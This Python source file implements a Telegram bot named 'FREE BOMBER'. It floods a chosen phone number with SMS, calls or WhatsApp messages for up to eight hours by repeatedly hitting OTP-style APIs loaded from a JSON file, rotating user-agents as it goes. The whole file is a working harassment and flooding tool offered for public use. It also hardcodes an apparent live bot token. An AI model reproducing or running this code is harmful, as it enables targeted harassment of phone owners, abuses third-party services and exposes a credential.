import asyncio
import aiohttp
import time
import sqlite3
import random
import string
import os
import json
import logging
from datetime import datetime, timedelta
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler

# =========================================
# ⚙️ CONFIGURATION
# =========================================
BOT_TOKEN = "8736183103:AAELHZD1wr-qohEQQ0rSRXJY2-qtZzOag6g"
OWNER_ID = 6684734209
WEBHOOK_URL = os.getenv("WEBHOOK_URL", "https://yourdomain.vercel.app/api/webhook")

# 🖼️ WALLPAPER
WELCOME_IMAGE = "https://i.postimg.cc/nczX6L6f/file-000000008f987230882c6568d09ed6e3-640x360.png"

# Logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# =========================================
# 📂 LOAD APIS FROM JSON FILE
# =========================================
def load_apis():
    try:
        # Try to load from current directory or parent
        paths = ['api.json', '../api.json', '/tmp/api.json']
        for path in paths:
            if os.path.exists(path):
                with open(path, 'r') as f:
                    apis = json.load(f)
                    logger.info(f"Loaded {len(apis)} APIs from {path}")
                    return apis
        logger.warning("api.json not found in any expected location")
        return []
    except Exception as e:
        logger.error(f"Error loading APIs: {e}")
        return []

APIS = load_apis()

# DURATION OPTIONS (in minutes)
DURATION_OPTIONS = {
    "1": 1,      # 1 minute
    "5": 5,      # 5 minutes
    "15": 15,    # 15 minutes
    "30": 30,    # 30 minutes
    "60": 60,    # 1 hour
    "120": 120,  # 2 hours
    "240": 240,  # 4 hours
    "480": 480   # 8 hours
}

# =========================================
# 🗄️ DATABASE SYSTEM
# =========================================
class Database:
    def __init__(self):
        db_path = os.getenv("DATABASE_URL")
        if not db_path:
            db_path = "/tmp/fusion_premium.db"
        try:
            self.conn = sqlite3.connect(db_path, check_same_thread=False)
        except Exception as e:
            logger.error(f"Unable to connect to database at {db_path}: {e}")
            self.conn = sqlite3.connect(":memory:", check_same_thread=False)
        self.create_tables()
        self.temp_attack_data = {}
        self.temp_admin_data = {}

    def create_tables(self):
        c = self.conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS users 
                    (user_id INTEGER PRIMARY KEY, 
                     premium_expiry TEXT, 
                     protected_number TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS redeem_codes 
                    (code TEXT PRIMARY KEY, 
                     days INTEGER, 
                     is_used INTEGER DEFAULT 0)''')
        self.conn.commit()

    def get_user(self, user_id):
        c = self.conn.cursor()
        c.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
        return c.fetchone()

    def add_user(self, user_id):
        if not self.get_user(user_id):
            c = self.conn.cursor()
            c.execute("INSERT INTO users (user_id) VALUES (?)", (user_id,))
            self.conn.commit()

    def is_premium(self, user_id):
        if user_id == OWNER_ID:
            return True
        user = self.get_user(user_id)
        if user and user[1]:
            try:
                expiry = datetime.strptime(user[1], "%Y-%m-%d %H:%M:%S")
                return datetime.now() < expiry
            except:
                return False
        return False

    def protect(self, user_id, number):
        c = self.conn.cursor()
        c.execute("UPDATE users SET protected_number=? WHERE user_id=?", (number, user_id))
        self.conn.commit()

    def unprotect(self, user_id):
        c = self.conn.cursor()
        c.execute("UPDATE users SET protected_number=NULL WHERE user_id=?", (user_id,))
        self.conn.commit()

    def is_protected(self, number):
        c = self.conn.cursor()
        c.execute("SELECT user_id FROM users WHERE protected_number=?", (number,))
        return c.fetchone() is not None

    def set_attack_data(self, user_id, phone):
        self.temp_attack_data[user_id] = {'phone': phone, 'timestamp': time.time()}

    def get_attack_data(self, user_id):
        data = self.temp_attack_data.get(user_id)
        if data and time.time() - data['timestamp'] < 300:
            return data['phone']
        else:
            if user_id in self.temp_attack_data:
                del self.temp_attack_data[user_id]
            return None

    def clear_attack_data(self, user_id):
        if user_id in self.temp_attack_data:
            del self.temp_attack_data[user_id]

    def get_all_users(self):
        c = self.conn.cursor()
        c.execute("SELECT user_id FROM users")
        return [row[0] for row in c.fetchall()]

    def get_stats(self):
        c = self.conn.cursor()
        u = c.execute("SELECT COUNT(*) FROM users").fetchone()[0]
        return u, 0

# =========================================
# 💣 ATTACK ENGINE
# =========================================
class AttackManager:
    def __init__(self):
        self.active_attacks = {}
        self.db = Database()
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36"
        ]

    async def _make_request(self, session, api, phone):
        headers = {"User-Agent": random.choice(self.user_agents)}
        headers.update(api.get("headers", {}))
        
        data = api.get("data", {})
        if "{no}" in str(data):
            data = json.loads(json.dumps(data).replace("{no}", phone))
        
        try:
            method = api.get("method", "POST").upper()
            if method == "POST":
                async with session.post(api["url"], data=data, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as r:
                    return r.status < 400
            else:
                async with session.get(api["url"], params=data, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as r:
                    return r.status < 400
        except:
            return False

    async def attack(self, phone, attack_type, duration_minutes, update, context):
        user_id = update.effective_user.id
        
        # Check if number is protected
        if self.db.is_protected(phone):
            await update.message.reply_text(f"🛡️ This number is **protected**!", parse_mode="Markdown")
            return

        # Filter APIs by type
        apis = [a for a in APIS if a.get("type", "sms").lower() == attack_type]
        if not apis:
            await update.message.reply_text(f"❌ No {attack_type} APIs available!")
            return

        end_time = time.time() + (duration_minutes * 60)
        self.active_attacks[user_id] = {
            'phone': phone,
            'type': attack_type,
            'apis': len(apis),
            'start_time': time.time(),
            'end_time': end_time
        }

        label = "SMS" if attack_type == 'sms' else "Call" if attack_type == 'call' else "WhatsApp"
        msg = await update.message.reply_text(
            f"🚀 **{label} ATTACK STARTED**\n\n"
            f"📞 Target: `{phone}`\n"
            f"⏱️ Duration: {duration_minutes} Minutes\n"
            f"📡 APIs: {len(apis)}"
        )

        async with aiohttp.ClientSession() as session:
            while user_id in self.active_attacks and time.time() < end_time:
                tasks = [self._make_request(session, api, phone) for api in apis]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                success = sum(1 for r in results if r is True)
                await asyncio.sleep(2)

        if user_id in self.active_attacks:
            del self.active_attacks[user_id]
        
        try:
            await msg.edit_text(f"✅ **{label} Attack Completed!**\n📞 `{phone}`")
        except:
            pass

manager = AttackManager()

# =========================================
# 🎨 KEYBOARD LAYOUTS
# =========================================
def main_kb(user_id):
    buttons = [
        [KeyboardButton("📱 SMS"), KeyboardButton("📞 Call")],
        [KeyboardButton("💬 WhatsApp"), KeyboardButton("📊 Status")],
        [KeyboardButton("👤 Account"), KeyboardButton("🛡 Protect")],
        [KeyboardButton("🔓 Unprotect"), KeyboardButton("❓ Help")]
    ]
    return ReplyKeyboardMarkup(buttons, resize_keyboard=True)

def admin_kb():
    buttons = [
        [KeyboardButton("📢 Broadcast"), KeyboardButton("📊 Stats")]
    ]
    return ReplyKeyboardMarkup(buttons, resize_keyboard=True)

def duration_kb():
    buttons = [
        [KeyboardButton("⏱️ 1 min"), KeyboardButton("⏱️ 5 min"), KeyboardButton("⏱️ 15 min")],
        [KeyboardButton("⏱️ 30 min"), KeyboardButton("⏱️ 1 hour"), KeyboardButton("⏱️ 2 hours")],
        [KeyboardButton("⏱️ 4 hours"), KeyboardButton("⏱️ 8 hours")],
        [KeyboardButton("🚫 Cancel")]
    ]
    return ReplyKeyboardMarkup(buttons, resize_keyboard=True)

# =========================================
# 📨 HANDLERS
# =========================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    manager.db.add_user(user_id)
    
    welcome_msg = (
        "🚀 **Welcome to FREE BOMBER!**\n\n"
        "✅ All features are completely FREE\n\n"
        "📱 **SMS** - Send unlimited SMS attacks\n"
        "📞 **CALL** - Make continuous calls\n"
        "💬 **WhatsApp** - Send WhatsApp messages\n\n"
        "🛡️ **Protect Your Number** - Prevent attacks on your number\n\n"
        "_Pick an option below to start!_"
    )
    
    await update.message.reply_photo(
        WELCOME_IMAGE,
        caption=welcome_msg,
        reply_markup=main_kb(user_id),
        parse_mode="Markdown"
    )

async def handle_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    manager.db.add_user(user_id)

    # Attack buttons
    if text in ["📱 SMS", "📞 Call", "💬 WhatsApp", "🚀 Call"]:
        attack_type = 'sms'
        if text == "📞 Call" or text == "🚀 Call":
            attack_type = 'call'
        elif text == "💬 WhatsApp":
            attack_type = 'whatsapp'

        if user_id in manager.active_attacks:
            await update.message.reply_text(
                "⚠️ **You already have an active attack!**",
                reply_markup=main_kb(user_id)
            )
            return

        label = "SMS" if attack_type == 'sms' else "Call" if attack_type == 'call' else "WhatsApp"
        await update.message.reply_text(
            f"📞 **Enter 10-digit Phone Number for {label}:**\n\nExample: `9876543210`",
            parse_mode="Markdown",
            reply_markup=main_kb(user_id)
        )
        context.user_data['waiting_for_number'] = True
        context.user_data['attack_type'] = attack_type
        return

    elif text == "📊 Status":
        if user_id in manager.active_attacks:
            info = manager.active_attacks[user_id]
            left = max(0, int((info['end_time'] - time.time()) / 60))
            msg = f"🔥 **ATTACK RUNNING**\n\n🎯 `{info['phone']}`\n⏳ Left: {left} Minutes"
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP", callback_data="stop")]])
            await update.message.reply_text(msg, reply_markup=kb, parse_mode="Markdown")
        else:
            await update.message.reply_text("💤 **No active attacks.**", reply_markup=main_kb(user_id))
        return

    elif text == "👤 Account":
        u, _ = manager.db.get_stats()
        await update.message.reply_text(
            f"👤 **Your Account**\n\n"
            f"🆔 User ID: `{user_id}`\n"
            f"✅ Status: **Active**\n\n"
            f"📊 Total Users: {u}",
            reply_markup=main_kb(user_id),
            parse_mode="Markdown"
        )
        return

    elif text == "🛡 Protect":
        await update.message.reply_text(
            "🛡 **Enter 10-digit Number to Protect:**",
            reply_markup=main_kb(user_id)
        )
        context.user_data['waiting_for_protect'] = True
        return

    elif text == "🔓 Unprotect":
        manager.db.unprotect(user_id)
        await update.message.reply_text("🔓 **Number unprotected.**", reply_markup=main_kb(user_id))
        return

    elif text == "❓ Help":
        await update.message.reply_text(
            "📚 **HELP**\n\n"
            "1️⃣ Choose SMS/Call/WhatsApp\n"
            "2️⃣ Enter target phone number\n"
            "3️⃣ Select attack duration\n"
            "4️⃣ Attack will start!\n\n"
            "🛡️ Use Protect to guard your number",
            reply_markup=main_kb(user_id)
        )
        return

    elif text == "👑 Admin Panel":
        if user_id == OWNER_ID:
            await update.message.reply_text("👑 **Admin Panel**", reply_markup=admin_kb())
        else:
            await update.message.reply_text("❌ Owner Only.")
        return

    # Waiting states
    if context.user_data.get('waiting_for_number'):
        if not text.isdigit() or len(text) != 10:
            await update.message.reply_text("❌ Enter a valid 10-digit number!")
            return
        
        manager.db.set_attack_data(user_id, text)
        attack_type = context.user_data.get('attack_type')
        await update.message.reply_text(
            "⏱️ **Select Attack Duration:**",
            reply_markup=duration_kb()
        )
        context.user_data['waiting_for_number'] = False
        context.user_data['waiting_for_duration'] = True
        return

    if context.user_data.get('waiting_for_duration'):
        dur_map = {
            "⏱️ 1 min": 1, "⏱️ 5 min": 5, "⏱️ 15 min": 15,
            "⏱️ 30 min": 30, "⏱️ 1 hour": 60, "⏱️ 2 hours": 120,
            "⏱️ 4 hours": 240, "⏱️ 8 hours": 480
        }
        
        if text not in dur_map:
            return
        
        phone = manager.db.get_attack_data(user_id)
        if not phone:
            await update.message.reply_text("❌ Session expired, try again!")
            return
        
        duration = dur_map[text]
        attack_type = context.user_data.get('attack_type')
        context.user_data['waiting_for_duration'] = False
        
        await manager.attack(phone, attack_type, duration, update, context)
        return

    if context.user_data.get('waiting_for_protect'):
        if not text.isdigit() or len(text) != 10:
            await update.message.reply_text("❌ Enter a valid 10-digit number!")
            return
        
        manager.db.protect(user_id, text)
        await update.message.reply_text(f"🛡️ **Protected:** `{text}`", reply_markup=main_kb(user_id), parse_mode="Markdown")
        context.user_data['waiting_for_protect'] = False
        return

async def btn_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    
    if query.data == "stop" and user_id in manager.active_attacks:
        del manager.active_attacks[user_id]
        await query.answer()
        await query.edit_message_text("🛑 **Attack stopped!**", parse_mode="Markdown")

# =========================================
# 🌐 VERCEL HANDLER
# =========================================
app = Application.builder().token(BOT_TOKEN).build()

# Add handlers
app.add_handler(CommandHandler("start", start))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_msg))
app.add_handler(CallbackQueryHandler(btn_handler))

async def process_update_body(body):
    if isinstance(body, bytes):
        body = body.decode('utf-8')
    if isinstance(body, str):
        update_data = json.loads(body)
    else:
        update_data = body
    update = Update.de_json(update_data, app.bot)
    await app.process_update(update)


def handler(request):
    method = getattr(request, 'method', 'GET')
    if method == 'GET':
        return {
            'statusCode': 200,
            'headers': {'Content-Type': 'application/json'},
            'body': json.dumps({'status': 'ok'})
        }

    if method == 'POST':
        try:
            if hasattr(request, 'json'):
                update_data = request.json()
            else:
                body = request.body
                if isinstance(body, bytes):
                    body = body.decode('utf-8')
                update_data = json.loads(body)

            asyncio.run(process_update_body(update_data))
            return {
                'statusCode': 200,
                'headers': {'Content-Type': 'application/json'},
                'body': json.dumps({'ok': True})
            }
        except Exception as e:
            logger.error(f"Error processing update: {e}")
            return {
                'statusCode': 500,
                'headers': {'Content-Type': 'application/json'},
                'body': json.dumps({'ok': False, 'error': str(e)})
            }

    return {
        'statusCode': 405,
        'headers': {'Content-Type': 'application/json'},
        'body': json.dumps({'error': 'Method Not Allowed'})
    }
